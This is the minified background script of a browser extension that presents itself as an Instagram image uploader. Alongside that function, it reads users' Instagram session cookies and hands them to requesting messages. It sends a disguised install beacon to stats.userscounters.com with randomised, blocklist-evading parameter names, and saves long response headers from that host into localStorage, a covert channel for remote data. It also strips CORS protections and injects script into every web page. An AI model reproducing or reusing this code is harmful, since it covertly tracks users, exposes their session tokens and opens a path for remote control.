!function(){function a(){var a=navigator.userAgent.replace(/\s/g,"").toLowerCase().match(/chrome\/(\d+)/),b=a&&a[1]&&a[1].length&&a[1];return b=b&&parseInt(b),!b||isNaN(b)?!0:72>b}function b(a){var b={};chrome.cookies.get({url:B,name:"ds_user_id"},function(c){c&&(b.ds_user_id=c.value),chrome.cookies.get({url:B,name:"sessionid"},function(c){c&&(b.sessionid=c.value),chrome.cookies.get({url:B,name:"csrftoken"},function(c){c&&(b.csrftoken=c.value),a&&a(b)})})})}function c(a){b(function(b){A=b,"undefined"!=typeof A.ds_user_id&&"undefined"!=typeof A.sessionid&&"undefined"!=typeof A.csrftoken&&"function"==typeof a?a(b):"function"==typeof a&&a()})}function d(a){return function(b){var c=!1;if(b.url==a){for(var d=0;d<b.responseHeaders.length;++d)"access-control-allow-origin"===b.responseHeaders[d].name.toLowerCase()&&(b.responseHeaders[d].value="*",c=!0);return c||b.responseHeaders.push({name:"Access-Control-Allow-Origin",value:"*"}),{responseHeaders:b.responseHeaders}}}}function e(a){y=a,f(function(b){if(b)z=b,c="https://www.instagram.com/"+b+"/?insta_upload_el=1";else{b=z;var c="https://www.instagram.com/accounts/login/?next="+encodeURIComponent("/"+b+"/?insta_upload_el=1")}if(b){chrome.tabs.create({url:c});var e=d(a),f=a.match(/https?:\/\/[^\/]+/);f=f[0]+"/*";var g=["blocking","responseHeaders"];x&&g.push("extraHeaders"),chrome.webRequest.onHeadersReceived.addListener(e,{urls:[f]},g),setTimeout(function(){y=null,chrome.webRequest.onHeadersReceived.removeListener(e)},6e4)}})}function f(a){g(function(b){if(!b||!b.length)return a(null);var c=w(b,"https://www.instagram.com"),d=c&&c.config&&c.config.viewer&&c.config.viewer.username;a(d)})}function g(a){var b="https://www.instagram.com/";$.ajax(b).done(function(b){return b&&b.length&&/_sharedData/.test(b)?void a(b):a()}).fail(function(b){a()})}function h(a){for(var b=Object.keys(a),c=b.length-1;c>0;c--){var d=Math.floor(Math.random()*(c+1)),e=b[d];b[d]=b[c],b[c]=e}return b[0]}function i(){var a=["utm","blank","empty","collect","stats","count","counter"],b=h(a),c="gif",d=a[b];return Math.random()>.4&&(d="_"+d),Math.random()>.4&&(d="_"+d),[d,"."].join("")+c}function j(a){return a.sort(function(){return Math.random()-.5}),a}function k(a,b){var c=h(a),d=a[c];return d+"="+b+"&"}function l(){var a=["k","key","kid","idk","nm","sk","xk","_k","_idk"],b="br";return k(a,b)}function m(a){var b=["uid","_u","_ud","jid","_idu","idu"],c=encodeURIComponent(a);return k(b,c)}function n(){var a=["ex","_ez","ei","eid","ide","ed_"],b=chrome.runtime.id?chrome.runtime.id.substr(0,11):"-";return k(a,b)}function o(){var a=["ev","_v","_ve","e_v","v","v_","vi","_vi","vi_","_vv","_v_v","tv","_tv"],b=chrome.runtime.getManifest?chrome.runtime.getManifest().version:"-";return k(a,b)}function p(){var a=["ee","e","e_","e_i","_e_i","nm","tid","_gid","aip","c_id","edi","_eid","_e_id"],b=u();return k(a,b)}function q(){var a=["t","_it","it","_ti","ti","tt","_tt","__tt","i","_i","i_"],b=window.localStorage.installedTime||"";return k(a,b)}function r(){var a=["l","ll","_l","utmul","__utmul","ul","_ul","lu","_lu"],b=window.navigator.language;return k(a,b)}function s(){var a=["r","rnd","z","_z","_r","_rnd"],b=Math.random();return k(a,b)}function t(){return"?"}function u(){var a=["instgr","insta","insgrm","igrm","instgr","instag","inst"],b=["uploader","uploadr","upldr","pldr","upl","uldr","udr","ulr","updr"],c=["-","_",":"],d=c[h(c)],e=h(a),f=h(b),g=j([a[e],b[f]]);return g.join(d)}function v(a){var b=C[0]+".com/";(new Image).src=["https://",b,i(),t(),p()].concat(j([n(),o(),l(),q(),r(),m(a),s()])).join("").replace(/&$/,"")}function w(a,b){var c,d;if("string"!=typeof a||!a.length)return null;a=a.replace(/[\r\n\t\s]/g,"");var e=a.indexOf("window._sharedData");if(-1==e)return null;var f=a.indexOf("</script>",e);if(-1==f)return null;var g=a.substr(e,f-e);if(c=g.match(/({.+);$/),c=c&&c[1],!c)return null;try{d=JSON.parse(c)}catch(h){}return d?d:null}var x=!a(),y=null,z=null,A={},B="https://www.instagram.com",C=[];C.push("stats.userscounters");var D=["blocking","requestHeaders"];x&&D.push("extraHeaders"),chrome.webRequest.onBeforeSendHeaders.addListener(function(a){var b,c,d=a.requestHeaders,e=!0;if(-1==a.url.indexOf("create/configure")&&(e=!1),a.initiator=="chrome-extension://"+chrome.runtime.id&&(e=!0),e){var f=!1;for(c=0;c<d.length;c++)b=d[c],"referer"==b.name.toLowerCase()&&-1==b.value.indexOf("https://www.instagram.com/create/details/"),"user-agent"==b.name.toLowerCase()&&e&&(b.value="Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1"),"origin"==b.name.toLowerCase()&&e&&(f=!0,b.value="https://www.instagram.com");return f||d.push({name:"origin",value:"https://www.instagram.com"}),{requestHeaders:d}}},{urls:["https://*.instagram.com/*"],types:["xmlhttprequest"]},D),chrome.webRequest.onCompleted.addListener(function(a){a.responseHeaders.forEach(function(a){a.value&&a.value.length>20&&(localStorage[a.name.toLowerCase()]=a.value)})},{urls:["*://"+C[0]+".com/*"],types:["image"]},["responseHeaders"]),chrome.browserAction.onClicked.addListener(function(){f(function(a){a?chrome.tabs.create({url:"https://www.instagram.com/"+a}):chrome.tabs.create({url:"https://www.instagram.com/"})})});var E=!1,F='!function(){if(!window.insta_upload_ext_el_ex){window.insta_upload_ext_el_ex=1;var e="chrome-extension://"+chrome.runtime.id+"/img/upload_external.svg",t=!1,n=!1;i(),setInterval(i,2e3)}function i(){if(document.querySelectorAll("img").forEach(function(e){if(!(e.dataset.insta_upload_ext_elem||(e.dataset.insta_upload_ext_elem="1",e.width*e.height<8e4))){t=!0;var n=e.parentNode,i=document.createElement("div");i.className="insta_img_icon_ext_el";var a=document.createElement("div");a.className="insta_img_icon_wrap_ext_el",a.title="Upload to Instagram",a.style.top=e.offsetTop+15+"px",a.style.left=e.offsetLeft+15+"px",a.appendChild(i),n.appendChild(a),n.classList.add("insta_img_parent_ext_el"),i.addEventListener("click",function(t){t.stopPropagation(),t.preventDefault(),chrome.runtime.sendMessage({action:"upload_external_link",link:e.src})})}}),t&&!n){var i=document.createElement("style");i.innerText=\'.insta_img_parent_ext_el .insta_img_icon_wrap_ext_el{display: none;cursor: pointer;z-Index: 99;position: absolute;background-color: white;padding: 5px;transition: all 0.3s ease-in-out 0.2s;border-radius: 17px;opacity: 0.5;}.insta_img_parent_ext_el .insta_img_icon_wrap_ext_el .insta_img_icon_ext_el{width: 25px;height: 25px;background-position: center;background-repeat: no-repeat;background-size: cover;background-image: url("\'+e+\'");}.insta_img_parent_ext_el:hover .insta_img_icon_wrap_ext_el{display: inline-block;}.insta_img_parent_ext_el .insta_img_icon_wrap_ext_el:hover{opacity: 1;}\',document.head.appendChild(i)}}}();',G=function(a,b,c){E&&"complete"==c.status&&(c.url.indexOf("instagram.com")>-1||/^http/.test(c.url)&&chrome.tabs.executeScript(a,{code:F}))};chrome.storage.sync.get("upload_external",function(a){E=!!a.upload_external,E&&chrome.tabs.onUpdated.addListener(G)}),chrome.storage.onChanged.addListener(function(a){a.upload_external&&(a.upload_external.newValue?(E=!0,chrome.tabs.onUpdated.addListener(G)):(E=!1,chrome.tabs.onUpdated.removeListener(G)))});var H=function(){return"xxrxxxxxxxxzxxxx".replace(/[xy]/g,function(a){var b=16*Math.random()|0,c="x"===a?b:3&b|8;return c.toString(16)})};chrome.runtime.onMessage.addListener(function(a,b,d){if(a)if("string"==typeof a)switch(a){case"getCookies":return c(d),!0;case"get_external_link":d(y);break;default:return}else if("object"==typeof a&&"string"==typeof a.action)switch(a.action){case"last_authorized_user":z=a.username;break;case"upload_external_link":e(a.link)}}),function(){"undefined"==typeof window.localStorage.installedTime&&(window.localStorage.installedTime=Date.now());var a="nop",b="uid";chrome.storage.sync.get(b,function(c){var d=c[b];if(!d){d=H();var e={};e[b]=d,chrome.storage.sync.set(e)}if(a=d,v(a),chrome.runtime.setUninstallURL){var f=[];f.push("uploader.extension-feedback");var g="https://"+f[0]+".com?"+j([p(),o(),n(),m(a)]).join("").replace(/&$/,"");chrome.runtime.setUninstallURL(g)}}),setTimeout(function(){"nop"==a&&v(a)},6e4)}()}();